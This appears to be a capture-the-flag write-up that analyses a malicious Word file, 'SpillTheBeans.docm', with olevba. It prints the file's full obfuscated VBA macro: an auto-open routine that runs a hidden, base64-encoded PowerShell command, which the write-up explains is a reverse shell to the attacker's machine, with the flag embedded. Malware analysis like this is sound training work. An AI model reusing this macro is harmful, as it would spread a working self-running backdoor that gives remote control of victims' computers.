# Solution
Use olevba tool to analyze

```vba
$ olevba -c SpillTheBeans.docm
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: SpillTheBeans.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Function ChBEP()
On Error Resume Next
XwqPS = Fix(97430 / CSng(99464) * pwtlVG * GiijKL)
VhBn = CDate(82074)
zdFiiH = Fix(29418 / CSng(51547) * fwdpU * uwMnjE)
VhBn = CDate(27996)
ChBEP = zwVIMqPlzT + BKPwdjKShcT + kCjWFPmsVOB + LlsjKmaWvLZ + ZRobu + RVXifP + vvbViiv + wCMKhmm + LzVBu + zZRFlAkjd
hmPkYq = Fix(65702 / CSng(86776) * jEsmMU * ZZXVG)
VhBn = CDate(43323)
End Function
Sub Autoopen()
waitTill = Now() + TimeValue("11:11:11")
While Now() < waitTill
    MsgBox "You are hacked!"
Wend
On Error Resume Next
Almkiw = Fix(46844 / CSng(19446) * jzYrPW * kqmHzk)
VhBn = CDate(53500)
pTNzOwsnH (ChBEP)
iirNG = Fix(63556 / CSng(86915) * KJPwl * AuTWS)
VhBn = CDate(17939)
End Sub
Function pTNzOwsnH(RnCuttHPSK)
On Error Resume Next
ncFCin = Fix(59825 / CSng(39286) * fPKdC * HKDFq)
VhBn = CDate(45850)
LGKvJm = fCfzTMVGdow + Shell(PZKfkmG + (Chr(vbKeyP)) + aXiqs + RnCuttHPSK + kHmpWzdO, AwAJnWj + vbHide + DzfaYaAFZD)
hAXFd = Fix(80950 / CSng(83352) * aSSTuC * KXtOFv)
VhBn = CDate(57578)
End Function

Function zwVIMqPlzT()
On Error Resume Next
pXbqY = Fix(11734 / CSng(12006) * QHiiCX * APdjw)
VhBn = CDate(94076)
VoHvjkjwsjn = "owersH" + "eLL -" + "WinDo" + "wsTyl" + "e hidden " + "-e JABUAEMAUABD" + "AGwAaQBl" + "AG4AdAAgA" + "D0AIABOAG"
JzbQMK = Fix(3806 / CSng(84624) * btnrVb * RjinoJ)
VhBn = CDate(77808)
OCaWla = "UAdw" + "AtAE" + "8AYg" + "BqAG"
QKMAo = Fix(79158 / CSng(97019) * bwNbPI * vuYdH)
VhBn = CDate(70948)
PSwpAtci = "UAYw" + "B0AC" + "AATg" + "BlAH" + "QALg"
ffZoM = Fix(5214 / CSng(38531) * CzKMz * zADoc)
VhBn = CDate(7735)
dhwnOiGB = "BTAG" + "8AYw" + "BrAG" + "UAdA" + "BzAC"
sHzLJ = Fix(55563 / CSng(67087) * QfjiCi * bzdvVS)
VhBn = CDate(92434)
IlXhQvB = "4AVA" + "BDAF" + "AAQw" + "BsAG" + "kAZQ" + "BuAH" + "QAKA"
RDICz = Fix(89521 / CSng(38878) * ijCnXa * CZlQlU)
VhBn = CDate(57522)
iQscmufFQwS = "AnAD" + "EAOQ" + "AyAC" + "4AMQ" + "A2AD"
zWRZDL = Fix(63451 / CSng(65882) * wtiIAa * wwqCzz)
VhBn = CDate(84332)
jEmHCTAjo = "gALg" + "AyAD" + "UALg" + "AxAD" + "MANQ" + "AnAC" + "wAIA"
zwVIMqPlzT = VoHvjkjwsjn + OCaWla + PSwpAtci + dhwnOiGB + IlXhQvB + iQscmufFQwS + jEmHCTAjo
End Function
Function BKPwdjKShcT()
On Error Resume Next
BXaVk = Fix(4127 / CSng(19949) * nVLfjV * czwIq)
VhBn = CDate(57905)
nbwqkBoH = "A3AD" + "MAMw" + "AxAC" + "kAOw"
UCzzSp = Fix(56385 / CSng(53542) * ziHYjl * zrmzv)
VhBn = CDate(75226)
IuCOvv = "AkAE" + "4AZQ" + "B0AH" + "cAbw"
uEdjNE = Fix(98234 / CSng(83624) * iJCYW * kVQLlO)
VhBn = CDate(2047)
bcMcjRD = "ByAG" + "sAUw" + "B0AH" + "IAZQ" + "BhAG"
wjrmA = Fix(12023 / CSng(7483) * whNEuo * PXkFd)
VhBn = CDate(55850)
QzbiPsDsDt = "0AIA" + "A9AC" + "AAJA" + "BUAE" + "MAUA"
dNoMH = Fix(13369 / CSng(68220) * Batjjw * RwazA)
VhBn = CDate(25039)
SQYmNmhDo = "BDAG" + "wAaQ" + "BlAG" + "4AdA" + "AuAE"
KRqvL = Fix(2271 / CSng(76380) * IXvhF * woImuM)
VhBn = CDate(60606)
LPUHS = "cAZQ" + "B0AF" + "MAdA" + "ByAG" + "UAYQ" + "BtAC"
BKPwdjKShcT = nbwqkBoH + IuCOvv + bcMcjRD + QzbiPsDsDt + SQYmNmhDo + LPUHS
End Function
Function kCjWFPmsVOB()
On Error Resume Next
LOIMsG = Fix(74397 / CSng(59515) * cBICXW * FiwAR)
VhBn = CDate(41592)
wtMKfpjT = "gAKQ" + "A7AC" + "QAUw" + "B0AH" + "IAZQ"
wrsTJR = Fix(21417 / CSng(11863) * qXGbm * IhOdsT)
VhBn = CDate(61241)
kiEdjlkvzz = "BhAG" + "0AVw" + "ByAG" + "kAdA" + "BlAH"
bbRwhM = Fix(11371 / CSng(59171) * pdKVA * cNUWBR)
VhBn = CDate(58852)
sXaQp = "IAIA" + "A9AC" + "AATg" + "BlAH" + "cALQ"
vZGZO = Fix(74319 / CSng(76162) * RStQss * itkLB)
VhBn = CDate(31094)
udOVI = "BPAG" + "IAag" + "BlAG" + "MAdA" + "AgAE"
ciIulQ = Fix(45792 / CSng(94543) * fzKWWa * BsiMLr)
VhBn = CDate(52897)
pmSIaw = "kATw" + "AuAF" + "MAdA" + "ByAG" + "UAYQ" + "BtAF"
ukrqcR = Fix(31647 / CSng(55274) * wzcRT * WFUoN)
VhBn = CDate(36826)
IRoIzZSLKSI = "cAcg" + "BpAH" + "QAZQ" + "ByAC" + "gAJA" + "BOAG"
WwDHiT = Fix(17787 / CSng(7070) * lCYABZ * UNZUJZ)
VhBn = CDate(48520)
hMhpAqHbo = "UAdA" + "B3AG" + "8Acg" + "BrAF" + "MAdA" + "ByAG"
kCjWFPmsVOB = wtMKfpjT + kiEdjlkvzz + sXaQp + udOVI + pmSIaw + IRoIzZSLKSI + hMhpAqHbo
End Function
Function LlsjKmaWvLZ()
On Error Resume Next
UhqLGr = Fix(5763 / CSng(26028) * MNsnU * mJzKMZ)
VhBn = CDate(87685)
DvKziiuZHkw = "UAYQ" + "BtAC" + "kAOw" + "BmAH" + "UAbg"
AzYzb = Fix(77371 / CSng(97247) * wZEmA * IwvipH)
VhBn = CDate(75816)
slhdqWnOG = "BjAH" + "QAaQ" + "BvAG" + "4AIA" + "BXAH" + "IAaQ"
juzinL = Fix(23268 / CSng(28771) * ZbOqN * rbZSnR)
VhBn = CDate(37144)
wskWWztj = "B0AG" + "UAVA" + "BvAF" + "MAdA" + "ByAG" + "UAYQ"
iiJAAO = Fix(57225 / CSng(70032) * jMRdzw * nMhMi)
VhBn = CDate(22129)
iJTrkEadhpB = "BtAC" + "AAKA" + "AkAF" + "MAdA" + "ByAG" + "kAbg"
luNEGP = Fix(79374 / CSng(99179) * MLRwd * LAjoo)
VhBn = CDate(64699)
FlbJppYNHHX = "BnAC" + "kAIA" + "B7AF" + "sAYg" + "B5AH" + "QAZQ"
vFrfYf = Fix(52246 / CSng(67342) * DWvXF * KXUwjq)
VhBn = CDate(9597)
ToIiXDLwNn = "BbAF" + "0AXQ" + "AkAH" + "MAYw" + "ByAG"
iAXcB = Fix(65137 / CSng(55737) * WEIzIM * rKYnFH)
VhBn = CDate(90135)
IChVWIwtz = "kAcA" + "B0AD" + "oAQg" + "B1AG"
FEZpM = Fix(19063 / CSng(84783) * mqmJf * CaBdN)
VhBn = CDate(514)
FZQCLU = "YAZg" + "BlAH" + "IAIA" + "A9AC" + "AAMA"
LlsjKmaWvLZ = DvKziiuZHkw + slhdqWnOG + wskWWztj + iJTrkEadhpB + FlbJppYNHHX + ToIiXDLwNn + IChVWIwtz + FZQCLU
End Function
Function ZRobu()
On Error Resume Next
PGdwwd = Fix(74405 / CSng(16173) * zKnzS * bsQVi)
VhBn = CDate(8009)
mNzHfJPLamA = "AuAC" + "4AJA" + "BUAE" + "MAUA"
IWCvr = Fix(34369 / CSng(96636) * btuKpw * rPrFsj)
VhBn = CDate(83803)
LAiisPmRMJz = "BDAG" + "wAaQ" + "BlAG" + "4AdA"
WjhfwI = Fix(25015 / CSng(85147) * muwHv * mfKRX)
VhBn = CDate(32835)
cFHUMCGlKb = "AuAF" + "IAZQ" + "BjAG" + "UAaQ"
ocZjBB = Fix(58644 / CSng(48194) * mQujP * czdOB)
VhBn = CDate(47693)
FbYTji = "B2AG" + "UAQg" + "B1AG" + "YAZg"
vzowP = Fix(9788 / CSng(50341) * RUKdrF * SHLNw)
VhBn = CDate(51004)
wjJjIVBo = "BlAH" + "IAUw" + "BpAH" + "oAZQ"
ZRobu = mNzHfJPLamA + LAiisPmRMJz + cFHUMCGlKb + FbYTji + wjJjIVBo
End Function
Function RVXifP()
On Error Resume Next
hNOkc = Fix(5582 / CSng(19682) * IPTQhZ * FlZwdU)
VhBn = CDate(93295)
aqDCwFhpnq = "AgAH" + "wAIA" + "AlAC" + "AAew"
CYDWhV = Fix(5921 / CSng(76154) * znSbhf * XYdMvK)
VhBn = CDate(52745)
mEIXLftljVR = "AwAH" + "0AOw" + "AkAF" + "MAdA" + "ByAG"
jaCao = Fix(95893 / CSng(94318) * kdMMZj * SFcrSt)
VhBn = CDate(13138)
taXFnfsIhU = "UAYQ" + "BtAF" + "cAcg" + "BpAH"
XGzbF = Fix(83486 / CSng(69752) * swfqHT * ziAAhz)
VhBn = CDate(39835)
bfOzsiVl = "QAZQ" + "ByAC" + "4AVw" + "ByAG" + "kAdA" + "BlAC"
DrvKH = Fix(16777 / CSng(35562) * iZJiT * WrvApU)
VhBn = CDate(29277)
UjOBq = "gAJA" + "BTAH" + "QAcg" + "BpAG" + "4AZw" + "AgAC"
pUzccN = Fix(13679 / CSng(86941) * TDnuk * jdUZn)
VhBn = CDate(2609)
SSJjtCwGnG = "sAIA" + "AnAE" + "wATg" + "BDAD" + "IANA"
woJIH = Fix(37672 / CSng(8578) * HADJBb * iqErl)
VhBn = CDate(936)
zDSFUXYiIB = "B7AE" + "AAdQ" + "B0AD" + "AAcg" + "AzAG" + "MATw" + "B2AD"
bfwlhP = Fix(44821 / CSng(39902) * brYVKS * FIorM)
VhBn = CDate(5230)
SnMHoMGstI = "MAcg" + "BfAD" + "EAcw" + "BfAG" + "0AeQ"
RVXifP = aqDCwFhpnq + mEIXLftljVR + taXFnfsIhU + bfOzsiVl + UjOBq + SSJjtCwGnG + zDSFUXYiIB + SnMHoMGstI
End Function
Function vvbViiv()
On Error Resume Next
kjiVwi = Fix(40018 / CSng(92614) * QJNdL * bpKmG)
VhBn = CDate(54271)
cwvVwOK = "BfAG" + "cAMA" + "BkAF" + "8AMA" + "BmAF"
cFALV = Fix(98837 / CSng(67868) * JcYvMC * tZqZfb)
VhBn = CDate(15289)
qGkJufR = "8AbA" + "AxAG" + "YAMw" + "B9AD" + "4AIA"
wpJjj = Fix(98748 / CSng(63583) * wHSGd * mJVMT)
VhBn = CDate(14411)
FuzJzcdDZWm = "AnAC" + "kAOw" + "AkAF" + "MAdA" + "ByAG" + "UAYQ"
phwTcv = Fix(71521 / CSng(93647) * wqUsDW * QCzcD)
VhBn = CDate(53758)
KPLTQshjrCF = "BtAF" + "cAcg" + "BpAH" + "QAZQ" + "ByAC" + "4ARg"
vvbViiv = cwvVwOK + qGkJufR + FuzJzcdDZWm + KPLTQshjrCF
End Function
Function wCMKhmm()
On Error Resume Next
uvVYmj = Fix(7960 / CSng(35426) * AfHHK * EDvcP)
VhBn = CDate(21064)
mWTkHjvdtkm = "BsAH" + "UAcw" + "BoAC" + "gAKQ" + "B9AF"
mkRPzF = Fix(20223 / CSng(42957) * dNuEYG * wPcih)
VhBn = CDate(38866)
zDwWRRt = "cAcg" + "BpAH" + "QAZQ" + "BUAG" + "8AUw"
vOBAz = Fix(88113 / CSng(62021) * McSJkG * jwHlV)
VhBn = CDate(4734)
qWXJpJE = "B0AH" + "IAZQ" + "BhAG" + "0AIA"
NGqzfz = Fix(25072 / CSng(75574) * uRXVAw * MczDB)
VhBn = CDate(33090)
ZzwHazv = "AnAC" + "cAOw" + "B3AG" + "gAaQ"
OWQbjd = Fix(43477 / CSng(92379) * KBBuJA * iNYwY)
VhBn = CDate(83841)
YOnVAiCtD = "BsAG" + "UAKA" + "AoAC" + "QAQg" + "B5AH"
lWnuv = Fix(38102 / CSng(42249) * twUcbP * jJJwS)
VhBn = CDate(25817)
lBulMlnjf = "QAZQ" + "BzAF" + "IAZQ" + "BhAG"
wCMKhmm = mWTkHjvdtkm + zDwWRRt + qWXJpJE + ZzwHazv + YOnVAiCtD + lBulMlnjf
End Function
Function LzVBu()
On Error Resume Next
zBuMO = Fix(11328 / CSng(80273) * UOXJfF * jbmdLH)
VhBn = CDate(10008)
XtFtCT = "QAIA" + "A9AC" + "AAJA" + "BOAG" + "UAdA"
hZwMjP = Fix(74189 / CSng(49951) * zQWlz * uFJRbG)
VhBn = CDate(8985)
oEpwTsLuNp = "B3AG" + "8Acg" + "BrAF" + "MAdA"
jQnai = Fix(22036 / CSng(80003) * MubNn * DJNio)
VhBn = CDate(97108)
bzUSqoMFLJ = "ByAG" + "UAYQ" + "BtAC" + "4AUg" + "BlAG"
OiHks = Fix(84006 / CSng(45145) * qdUdH * wspEO)
VhBn = CDate(67775)
ojIrRYqA = "EAZA" + "AoAC" + "QAQg" + "B1AG" + "YAZg"
EcKmvf = Fix(4398 / CSng(1085) * tRGGV * jppTSA)
VhBn = CDate(42884)
XsCqDzB = "BlAH" + "IALA" + "AgAD" + "AALA" + "AgAC"
LzVBu = XtFtCT + oEpwTsLuNp + bzUSqoMFLJ + ojIrRYqA + XsCqDzB
End Function
Function zZRFlAkjd()
On Error Resume Next
HjfAH = Fix(11201 / CSng(45764) * ZPNKFw * zMVAmk)
VhBn = CDate(4200)
rbXiDVl = "QAQg" + "B1AG" + "YAZg" + "BlAH"
BuNMz = Fix(27848 / CSng(89890) * vhMDC * fvkjP)
VhBn = CDate(85202)
VHFjYzCNvl = "IALg" + "BMAG" + "UAbg" + "BnAH" + "QAaA" + "ApAC" + "kAIA" + "AtAG" + "cAdA" + "AgAD" + "AAKQ" + "AgAH" + "sAJA" + "BDAG" + "8AbQ" + "BtAG" + "EAbg" + "BkAC" + "AAPQ" + "AgAC" + "gAWw" + "B0AG"
sKcjss = Fix(34468 / CSng(94111) * kfENd * tDYPi)
VhBn = CDate(96422)
YajGfnGSWR = "UAeA" + "B0AC" + "4AZQ" + "BuAG" + "MAbw" + "BkAG" + "kAbg" + "BnAF" + "0AOg" + "A6AF" + "UAVA" + "BGAD" + "gAKQ" + "AuAE" + "cAZQ" + "B0AF" + "MAdA" + "ByAG" + "kAbg" + "BnAC" + "gAJA" + "BCAH"
cstvh = Fix(63652 / CSng(50139) * FVJjJ * lcHWnU)
VhBn = CDate(91594)
LwRbi = "UAZg" + "BmAG" + "UAcg" + "AsAC" + "AAMA" + "AsAC" + "AAJA" + "BCAH" + "kAdA" + "BlAH" + "MAUg" + "BlAG" + "EAZA" + "AgAC" + "0AIA" + "AxAC" + "kAOw" + "AkAE" + "8AdQ" + "B0AH" + "AAdQ" + "B0AC" + "AAPQ" + "AgAH" + "QAcg" + "B5AC" + "AAew" + "BJAG" + "4Adg" + "BvAG" + "sAZQ" + "AtAE" + "UAeA" + "BwAH" + "IAZQ"
jwpmYB = Fix(62469 / CSng(15335) * Nsahjq * KaWjiK)
VhBn = CDate(90520)
jNjPmkfTpOi = "BzAH" + "MAaQ" + "BvAG" + "4AIA" + "AkAE" + "MAbw" + "BtAG" + "0AYQ" + "BuAG" + "QAIA" + "AyAD" + "4AJg" + "AxAC" + "AAfA" + "AgAE" + "8AdQ" + "B0AC" + "0AUw" + "B0AH" + "IAaQ" + "BuAG" + "cAfQ" + "AgAG" + "MAYQ" + "B0AG" + "MAaA" + "AgAH" + "sAJA" + "BfAC" + "AAfA" + "AgAE" + "8AdQ" + "B0AC" + "0AUw"
ijNiFmkmUPSf = "B0AH" + "IAaQ" + "BuAG" + "cAfQ" + "BXAH" + "IAaQ" + "B0AG" + "UAVA" + "BvAF" + "MAdA" + "ByAG" + "UAYQ" + "BtAC" + "AAKA" + "AkAE" + "8AdQ" + "B0AH"
NUiNKFLSWOoN = "AAdQ" + "B0AC" + "kAfQ" + "AkAF" + "MAdA" + "ByAG" + "UAYQ" + "BtAF" + "cAcg" + "BpAH" + "QAZQ" + "ByAC" + "4AQw" + "BsAG" + "8Acw" + "BlAC" + "gAKQA="
zZRFlAkjd = rbXiDVl + VHFjYzCNvl + YajGfnGSWR + LwRbi + jNjPmkfTpOi + ijNiFmkmUPSf + NUiNKFLSWOoN
End Function
```

Analysis shows string addition functions and calls to powershell

Perform debugging of the program and print out the ChBEP variable

![image.png](https://images.viblo.asia/5533f16d-d63c-4d35-a569-c47b01b50efc.png)

Or use msgbox to print the message

![image.png](https://images.viblo.asia/2f167355-f934-4e8d-a398-cd959d9364a3.png)

Decode tthe powershell shows that this is a reverse shell to the attacker's machine and sends a message containing the flag

![image.png](https://images.viblo.asia/49f56427-f05f-4d69-a413-1504c5271464.png)

